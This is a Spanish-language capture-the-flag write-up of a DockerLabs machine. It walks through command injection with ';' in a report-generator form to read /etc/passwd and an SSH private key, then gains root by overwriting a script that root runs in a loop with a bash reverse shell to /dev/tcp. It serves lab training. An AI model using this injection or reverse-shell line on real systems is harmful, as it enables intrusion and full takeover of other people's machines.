Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #command-injection #ssh #cron-abuse #reverse-shell
 

![](assets/Pasted%20image%2020251108192308.png)


## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
> ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.164 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.164/0.164/0.164/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- --open -sS --min-rate 5000 -Pn -n 172.17.0.2
--------------------------------------------------------------
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

- Puertos 22 y 80 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> nmap -p 22,80 -Pn -n --min-rate 5000 -sCV -sS 172.17.0.2 -oN target.txt
-------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f5:4f:86:a5:d6:14:16:67:8a:8e:b6:b6:4a:1d:e7:1f (ECDSA)
|_  256 e6:86:46:85:03:d2:99:70:99:aa:70:53:40:5d:90:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Generador de Reportes - Centro de Operaciones
MAC Address: AA:58:E1:5F:A8:6B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH OpenSSH 9.6p1 Ubuntu 3ubuntu13.4
- Puerto 80 HTTP Apache httpd 2.4.58 (Ubuntu)

## Enumeración

### Puerto 80 HTTP

La página principal muestra un **generador de reportes** que permite crear reportes con nombre y fecha, devolviendo la ruta donde se guardó y el contenido indicado.

![](assets/Pasted%20image%2020251108194014.png)

También existe una pestaña para **subir archivos**.

![](assets/Pasted%20image%2020251108194043.png)

**Fuzzing de Directorios.**

Utilizo `gobuster` para descubrir posibles recursos en el servidor web.

```bash
> gobuster dir -w /home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://172.17.0.2/ -x html,php,py,js,txt
----------------------------------------------------------------------------------------------------------------------------------------------------------
/scripts.js           (Status: 200) [Size: 1090]
/upload.html          (Status: 200) [Size: 2314]
/upload.js            (Status: 200) [Size: 1645]
/upload.php           (Status: 200) [Size: 33]
/old                  (Status: 301) [Size: 306] [--> http://172.17.0.2/old/]
/index.php            (Status: 200) [Size: 2953]
/server-status        (Status: 403) [Size: 275]
/reportes             (Status: 301) [Size: 311] [--> http://172.17.0.2/reportes/]
```

- `scripts.js`: Script para animación de la barra de progreso
- `upload.html` e `index.php`: Pestañas principales de la aplicación
- `upload.php`: Script backend para subir archivos
- `old/`: Versión antigua de la aplicación (sin contenido relevante)
- `reportes/`: Directorio donde se guardan los reportes generados

## Explotación

### Intento de Subida de Reverse Shell

Mi primer enfoque fue intentar subir una reverse shell PHP mediante la funcionalidad de upload.

![](assets/Pasted%20image%2020251108201528.png)

El archivo se sube correctamente, pero no encuentro un directorio accesible para ejecutarlo.

### Command Injection en el Generador de Reportes

Decido probar **inyección de comandos** en el formulario del generador de reportes. Intento inyectar comandos directamente en el campo de nombre.

![](assets/Pasted%20image%2020251108202027.png)

El servidor no interpreta el comando, simplemente lo trata como texto literal.

![](assets/Pasted%20image%2020251108202037.png)

Mi hipótesis es que internamente el servidor ejecuta algo similar a:

```bash
echo 'Nombre: cat /etc/passwd' > archivo.txt
```

### Bypass mediante Separador de Comandos

Intento usar el separador `;` para encadenar comandos. Los separadores de comandos en bash permiten ejecutar múltiples comandos secuencialmente.

![](assets/Pasted%20image%2020251108202319.png)

Internamente, esto debería resultar en:

```bash
echo 'Nombre: ; cat /etc/passwd' > archivo.txt
```

El servidor interpreta correctamente el comando y vuelca el contenido de `/etc/passwd`.

![](assets/Pasted%20image%2020251108202403.png)

- Descubro un usuario llamado `samara`

### Extracción de Clave SSH

Con la capacidad de ejecutar comandos, tengo varias opciones:
- Establecer una reverse shell
- Fuerza bruta SSH con hydra
- Leer la clave SSH privada de samara

Opto por leer la clave SSH privada, ya que una reverse shell me daría acceso como `www-data` y probablemente necesitaría migrar a `samara` de todas formas.

![](assets/Pasted%20image%2020251108202905.png)

La clave SSH se vuelca correctamente.

![](assets/Pasted%20image%2020251108202949.png)

Descargo la clave en mi sistema, ajusto los permisos y me conecto por SSH.

```bash
> chmod 600 key
> ssh -i key samara@172.17.0.2
---------------------------------
samara@ad7c505509df:~$ whoami
samara
samara@ad7c505509df:~$ id
uid=1000(samara) gid=1000(samara) groups=1000(samara)
```

## Escalada de Privilegios

Dentro del sistema enumero el contenido del directorio home.

```bash
samara@ad7c505509df:~$ ls
message.txt  user.txt
samara@ad7c505509df:~$ cat message.txt 
No tienes permitido estar aqui :(.
samara@ad7c505509df:~$ cat user.txt
030208509edea7480a10b84baca3df3e
```

El archivo `user.txt` contiene un hash MD5 (32 caracteres). Intento crackearlo con `john` y `hashcat` sin éxito.

```bash
> sudo john --format=raw-md5 hash.txt
> hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Enumeración de Procesos de Root

Busco procesos ejecutados por el usuario root.

```bash
> ps aux | grep root
-----------------------------------------------------------------------------------------------------------------------------------------------------------------
root  1  5.1  0.0   2800  1748 ? Ss 02:32   3:23 /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done
```

Encuentro un **bucle infinito** que ejecuta el script `/usr/local/bin/echo.sh` como root.

### Modificación del Script para Reverse Shell

Como el script es ejecutado periódicamente por root, puedo modificarlo para establecer una reverse shell.

Me pongo en escucha en mi máquina atacante.

```bash
> sudo nc -nlvp 443
listening on [any] 443 ...
```

Modifico el contenido del script `echo.sh`.

```bash
> nano /usr/local/bin/echo.sh
samara@ad7c505509df:~$ cat /usr/local/bin/echo.sh
#!/bin/bash

bash -i >& /dev/tcp/172.17.0.1/443 0>&1
```

Después de unos segundos, el proceso ejecutado por root ejecuta el script modificado y recibo la conexión.

```bash
> Connection received on 172.17.0.2 57956
root@ad7c505509df:/# whoami
root
root@ad7c505509df:/# id
uid=0(root) gid=0(root) groups=0(root)
```

***PWNED***
